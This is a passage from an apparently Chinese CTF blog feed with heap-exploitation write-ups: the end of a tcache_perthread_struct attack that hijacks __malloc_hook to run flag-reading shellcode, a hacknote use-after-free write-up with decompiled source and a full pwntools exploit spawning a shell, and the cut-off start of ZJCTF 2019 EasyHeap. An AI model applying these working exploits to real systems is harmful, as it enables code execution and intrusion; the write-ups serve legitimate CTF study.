class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">20392</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/turing/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x12次操作</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):  <span class="comment">#最多8次alloc</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;id: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;id: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):   <span class="comment">#最多3次free</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;id: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choice: &quot;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x260</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x99</span>) <span class="comment">#3 指向tcache_perthread_struct(heap_base+0x10)</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;\x07&#x27;</span>*<span class="number">0x40</span>) <span class="comment">#修改tcache_perthread_struct中的对应tcache bins的chunk数量</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#进入unsorted bin</span></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">malloc_hook_add=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span><span class="comment"># 泄露出malloc_hook，在较低版本中unsortedbin的表头距main_arena起始地址的偏移为88，这个版本为96。而malloc_hook距main_arena就是0x10</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(malloc_hook_add))</span><br><span class="line"><span class="comment">#libcbase=malloc_hook_add-libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line">alloc(<span class="number">0x100</span>) <span class="comment">#4，将tcache_perthread_struct申请回来了</span></span><br><span class="line">magic_add=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x40</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+p64(malloc_hook_add)+p64(magic_add)) <span class="comment">#修改0x80和0x90的tcachebin为malloc_hook和rwx内存</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line">flag_add=heap_base+<span class="number">0x270</span> <span class="comment">#将flag读入堆区</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,flag_add,<span class="number">0x30</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,flag_add,<span class="number">0x30</span>)</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#5 申请到rwx内存</span></span><br><span class="line">edit(<span class="number">5</span>, shellcode)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Done!&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0x70</span>) <span class="comment">#6 申请到malloc_hook地址</span></span><br><span class="line">edit(<span class="number">6</span>, p64(magic_add))<span class="comment">#将malloc_hook指向shellcode</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#7 执行malloc_hook</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> tcache attack </category>
          
          <category> tcache_perthread_struct </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HeapExploitation-practice</title>
      <link href="/2025/07/01/HeapExploitation-practice/"/>
      <url>/2025/07/01/HeapExploitation-practice/</url>
      
        <content type="html"><![CDATA[<h2 id="hitcontraining-uaf-hacknote"><a href="#hitcontraining-uaf-hacknote" class="headerlink" title="hitcontraining_uaf &#x2F; hacknote"></a>hitcontraining_uaf &#x2F; hacknote</h2><h3 id="复盘-uaf-heapoverflow"><a href="#复盘-uaf-heapoverflow" class="headerlink" title="复盘&#x2F;uaf&#x2F;heapoverflow"></a>复盘&#x2F;uaf&#x2F;heapoverflow</h3><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      del_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单题<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;       HackNote       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Add note          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Delete note       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Print note        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Exit              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>各个选项函数如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v1; // esi</span><br><span class="line">  char buf[8]; // [esp+0h] [ebp-18h] BYREF</span><br><span class="line">  size_t size; // [esp+8h] [ebp-10h]</span><br><span class="line">  int i; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  result = count;</span><br><span class="line">  if ( count &gt; 5 )</span><br><span class="line">    return puts(&quot;Full&quot;);</span><br><span class="line">  for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *((_DWORD *)&amp;notelist + i);</span><br><span class="line">    if ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)&amp;notelist + i) = malloc(8u);</span><br><span class="line">      if ( !*((_DWORD *)&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Alloca Error&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      **((_DWORD **)&amp;notelist + i) = print_note_content;</span><br><span class="line">      printf(&quot;Note size :&quot;);</span><br><span class="line">      read(0, buf, 8u);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v1 = *((_DWORD *)&amp;notelist + i);</span><br><span class="line">      *(_DWORD *)(v1 + 4) = malloc(size);</span><br><span class="line">      if ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + 4) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Alloca Error&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;Content :&quot;);</span><br><span class="line">      read(0, *(void **)(*((_DWORD *)&amp;notelist + i) + 4), size);</span><br><span class="line">      puts(&quot;Success !&quot;);</span><br><span class="line">      return ++count;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个我们申请的chunk其实实现时申请了两个chunk，第一个数据区大小0x8储存print_note_content，一个函数，接下才是我们申请大小的chunk<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *((_DWORD *)&amp;notelist + v2);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(*((_DWORD *)&amp;notelist + v2) + <span class="number">4</span>));</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;notelist + v2));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free后指针没有置NULL<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *((_DWORD *)&amp;notelist + v2);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> (**((<span class="type">int</span> (__cdecl ***)(_DWORD))&amp;notelist + v2))(*((_DWORD *)&amp;notelist + v2));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>print_note其实是调用对应的chunk的第一个数据域0x8大小的chunk存储的函数<br>我们在ida中又发现后门函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int magic()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:08048945 magic           proc near</span><br><span class="line">.text:08048945</span><br><span class="line">.text:08048945 var_4           = dword ptr -4</span><br><span class="line">.text:08048945</span><br><span class="line">.text:08048945 ; __unwind &#123;</span><br><span class="line">.text:08048945                 push    ebp</span><br><span class="line">.text:08048946                 mov     ebp, esp</span><br><span class="line">.text:08048948                 push    ebx</span><br><span class="line">.text:08048949                 sub     esp, 4</span><br><span class="line">.text:0804894C                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:08048951                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:08048956                 sub     esp, 0Ch</span><br><span class="line">.text:08048959                 lea     edx, (aBinSh - 804A000h)[eax] ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0804895F                 push    edx             ; command</span><br><span class="line">.text:08048960                 mov     ebx, eax</span><br><span class="line">.text:08048962                 call    _system</span><br></pre></td></tr></table></figure><p>位于0x8048945处<br>checksec看一眼<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">turing@LAPTOP-6JKPOVPE:~$ checksec hacknote</span><br><span class="line">[*] <span class="string">&#x27;/home/turing/hacknote&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>很好，32位保护全关<br>delete_note函数存在uaf漏洞，我们先申请两个大小0x20（只要不等于0x8且在fastbin要求内即可，如果申请0x8的chunk，释放时会和存储print_note_content函数的chunk放在同一个fastbin中，后续便不好处理了）的chunk，chunk0和chunk1<br>再分别释放掉，这时其实释放了四个chunk，两两位于不同的fastbin中<br>只要我们再申请一个0x8大小的chunk，程序需要分配两个0x8的chunk，正好是chunk0和chunk1的函数chunk，然后我们写入magic函数的地址，便覆盖了chunk0的print_note_content函数，这时候再执行print chunk0时候就直接getshell了<br>wp如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29391</span>)</span><br><span class="line">shell_add=<span class="number">0x08048945</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">put</span>(<span class="params">num</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p64(shell_add))</span><br><span class="line">put(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><h3 id="复盘-fastbin-attack-got表覆写-heapoverflow"><a href="#复盘-fastbin-attack-got表覆写-heapoverflow" class="headerlink" title="复盘&#x2F;fastbin attack&#x2F;got表覆写&#x2F;heapoverflow"></a>复盘&#x2F;fastbin attack&#x2F;got表覆写&#x2F;heapoverflow</h3><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span 